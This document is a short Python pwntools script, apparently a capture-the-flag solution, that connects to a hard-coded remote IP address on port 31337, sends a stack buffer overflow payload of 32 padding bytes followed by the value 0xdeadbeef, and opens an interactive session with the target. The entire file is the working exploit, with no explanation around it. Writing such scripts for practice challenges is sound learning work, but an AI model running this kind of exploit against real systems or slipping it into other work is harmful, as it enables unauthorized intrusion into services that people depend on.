from pwn import *

submit = remote("139.144.184.150", 31337)

payload = "A"*32 + "\xef\xbe\xad\xde"

submit.send(payload)
#submit.recv()
submit.interactive()
